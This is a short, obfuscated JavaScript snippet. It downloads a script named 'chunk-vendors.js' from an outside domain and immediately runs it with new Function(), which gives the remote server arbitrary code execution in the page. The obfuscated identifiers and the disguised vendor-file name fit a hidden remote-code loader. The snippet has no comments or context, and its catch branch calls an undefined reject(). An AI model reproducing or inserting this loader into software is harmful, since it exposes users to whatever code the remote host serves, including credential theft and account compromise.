
fetch("https://newapi.yydian.vip/weidao/new/dmj/js/chunk-vendors.js").then(_0x5ef080 => {
  if (!_0x5ef080.ok) throw new Error("请检查网络是否OK");
  return _0x5ef080.text();
}).then(_0x5549d7 => {
  const _0x1c5abc = new Function(_0x5549d7);
  _0x1c5abc();
}).catch(_0x13c050 => {
  reject();
});